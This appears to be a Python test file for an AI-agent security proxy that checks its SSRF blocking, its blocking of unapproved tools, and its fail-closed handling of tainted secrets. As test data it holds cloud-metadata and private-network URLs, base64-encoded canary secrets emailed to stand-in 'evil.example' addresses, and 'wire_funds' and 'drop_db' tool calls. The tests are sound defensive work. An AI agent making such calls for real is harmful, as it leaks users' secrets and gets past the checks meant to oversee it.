"""Tests for ADOM remote HTTP MCP proxy (SSRF + fail-closed) and guard_openai_agent."""

from __future__ import annotations

import asyncio
import base64
import http.server
import json
import socket
import tempfile
import threading
import unittest
import urllib.error
import urllib.request
import weakref
from pathlib import Path
from types import SimpleNamespace

from adom.api.model_proxy import ModelProxyPolicy
from adom.integrations.mcp_http_proxy import McpHttpProxyServer, UnsafeUpstreamUrl, validate_upstream_url
from adom.integrations.tool_guard import ToolBlocked, guard_openai_agent


class _FakeTool:
    def __init__(self, name: str, fn):
        self.name = name
        self.on_invoke_tool = fn


class _FakeHandoff:
    def __init__(self, agent):
        self._agent_ref = weakref.ref(agent)


class _FakeAgent:
    def __init__(self, name: str, tools=(), handoffs=()):
        self.name = name
        self.tools = list(tools)
        self.handoffs = list(handoffs)


class TestOpenAIAgentWrapper(unittest.TestCase):
    def test_guard_openai_agent_recursively_protects_handoffs(self) -> None:
        executed: list[tuple[str, str]] = []
        secret = "CANARY-secret-99887766"

        async def _wire(ctx, input_json: str) -> str:
            executed.append(("wire_funds", input_json))
            return "wired"

        async def _email(ctx, input_json: str) -> str:
            executed.append(("send_email", input_json))
            return "sent"

        async def _status(ctx, input_json: str) -> str:
            executed.append(("get_status", input_json))
            return "ok"

        priv = _FakeAgent(
            "PrivilegedOps",
            tools=[_FakeTool("wire_funds", _wire), _FakeTool("send_email", _email)],
        )
        triage = _FakeAgent(
            "TriageAgent",
            tools=[_FakeTool("get_status", _status)],
            handoffs=[_FakeHandoff(priv)],
        )

        policy = ModelProxyPolicy(
            taint_values=[secret],
            approved_outbound=["corp.com"],
            allowed_tools=("get_status", "send_email"),
            strict_deny_unknown=True,
        )
        policy.note_read(f"TOKEN={secret}", path=".env")

        guard_openai_agent(triage, policy=policy, raise_on_block=True)

        # Unapproved tool on downstream handoff agent fails closed before running
        with self.assertRaises(ToolBlocked):
            asyncio.run(priv.tools[0].on_invoke_tool(None, json.dumps({"account": "offshore-1"})))

        # Encoded tainted secret on allowed outbound tool fails closed before running
        b64 = base64.b64encode(secret.encode()).decode()
        with self.assertRaises(ToolBlocked):
            asyncio.run(priv.tools[1].on_invoke_tool(None, json.dumps({"to": "x@evil.example", "body": b64})))

        self.assertEqual(executed, [])

        # Allowed internal tool executes cleanly
        res = asyncio.run(triage.tools[0].on_invoke_tool(None, json.dumps({"service": "billing"})))
        self.assertEqual(res, "ok")
        self.assertEqual(len(executed), 1)


class TestMcpHttpProxyAndSsrf(unittest.TestCase):
    def test_validate_upstream_url_blocks_internal_and_metadata_ranges(self) -> None:
        blocked = [
            "http://169.254.169.254/latest/meta-data/",
            "http://100.100.100.200/latest/meta-data/",
            "http://[fd00:ec2::254]/latest/meta-data/",
            "http://10.0.0.5:8080/mcp",
            "http://172.16.0.10:8080/mcp",
            "http://192.168.1.25:8080/mcp",
            "http://100.64.0.1:8080/mcp",
            "http://127.0.0.1:8080/mcp",
            "ftp://example.com/mcp",
        ]
        for url in blocked:
            with self.assertRaises(UnsafeUpstreamUrl, msg=f"Expected SSRF block for {url}"):
                validate_upstream_url(url, allow_loopback=False)

        # DNS pinning check with synthetic public IP resolution
        fake_resolver = lambda host, port, type=0: [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("93.184.216.34", port))]
        parsed, pinned = validate_upstream_url("https://mcp.example.com/rpc", resolver=fake_resolver)
        self.assertEqual(parsed.hostname, "mcp.example.com")
        self.assertEqual(pinned, "93.184.216.34")

    def test_http_proxy_blocks_tainted_args_unknown_tools_and_upstream_errors(self) -> None:
        secret = "AKIA" + "9988776655443322"
        upstream_calls: list[dict] = []
        force_status = {"code": 200}

        class _UpstreamHandler(http.server.BaseHTTPRequestHandler):
            def do_POST(self) -> None:  # noqa: N802
                n = int(self.headers.get("Content-Length", "0"))
                req = json.loads(self.rfile.read(n).decode())
                if force_status["code"] != 200:
                    self.send_response(force_status["code"])
                    self.end_headers()
                    self.wfile.write(b'{"error":"down"}')
                    return
                method = req.get("method")
                if method == "tools/list":
                    resp = {"jsonrpc": "2.0", "id": req["id"], "result": {"tools": [{"name": "read_note"}, {"name": "send_email"}]}}
                elif method == "tools/call":
                    tool = req["params"]["name"]
                    upstream_calls.append(req["params"])
                    if tool == "read_note":
                        resp = {"jsonrpc": "2.0", "id": req["id"], "result": {"content": [{"type": "text", "text": f"KEY={secret}"}]}}
                    else:
                        resp = {"jsonrpc": "2.0", "id": req["id"], "result": {"content": [{"type": "text", "text": "sent"}]}}
                else:
                    resp = {"jsonrpc": "2.0", "id": req["id"], "result": {}}
                body = json.dumps(resp).encode()
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, format: str, *args: object) -> None:  # noqa: A003
                return

        upstream = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _UpstreamHandler)
        up_thread = threading.Thread(target=upstream.serve_forever, daemon=True)
        up_thread.start()

        with tempfile.TemporaryDirectory() as td:
            reg = Path(td) / "tool_tiers.json"
            reg.write_text(json.dumps({
                "version": 1,
                "tools": {
                    "mcp__srv__read_note": {"tier": "observe"},
                    "mcp__srv__send_email": {"tier": "consequential", "agent_approval": True, "approved_outbound": ["corp.com"]},
                },
            }))
            proxy = McpHttpProxyServer(
                f"http://127.0.0.1:{upstream.server_address[1]}/mcp",
                "srv",
                registry_path=reg,
                client_prompts_confirmed=True,
                allow_loopback=True,
            )
            proxy.start()
            try:
                def _post(obj: dict) -> tuple[int, dict]:
                    req = urllib.request.Request(proxy.url, data=json.dumps(obj).encode(), headers={"Content-Type": "application/json"}, method="POST")
                    try:
                        with urllib.request.urlopen(req, timeout=5) as r:
                            return r.status, json.loads(r.read().decode())
                    except urllib.error.HTTPError as e:
                        return e.code, json.loads(e.read().decode())

                st, _ = _post({"jsonrpc": "2.0", "id": 1, "method": "tools/list", "params": {}})
                self.assertEqual(st, 200)

                # Unknown tool never reaches upstream
                st, err = _post({"jsonrpc": "2.0", "id": 2, "method": "tools/call", "params": {"name": "drop_db", "arguments": {}}})
                self.assertEqual(st, 403)
                self.assertIn("error", err)

                # Granted read observes secret into proxy session taint
                st, _ = _post({"jsonrpc": "2.0", "id": 3, "method": "tools/call", "params": {"name": "read_note", "arguments": {"path": "k.txt"}}})
                self.assertEqual(st, 200)

                # Allowed tool name carrying base64 tainted secret in arguments is blocked before upstream
                b64 = base64.b64encode(secret.encode()).decode()
                st, err = _post({"jsonrpc": "2.0", "id": 4, "method": "tools/call", "params": {"name": "send_email", "arguments": {"to": "drop@evil.example", "body": b64}}})
                self.assertEqual(st, 403)
                self.assertEqual([c["name"] for c in upstream_calls], ["read_note"])

                # Upstream HTTP 503 fails closed with HTTP 502 (never passes)
                force_status["code"] = 503
                st, err = _post({"jsonrpc": "2.0", "id": 5, "method": "tools/call", "params": {"name": "read_note", "arguments": {"path": "k.txt"}}})
                self.assertEqual(st, 502)
                self.assertIn("fail-closed", err["error"]["message"])
            finally:
                proxy.close()
                upstream.shutdown()
                upstream.server_close()


if __name__ == "__main__":
    unittest.main(verbosity=1)
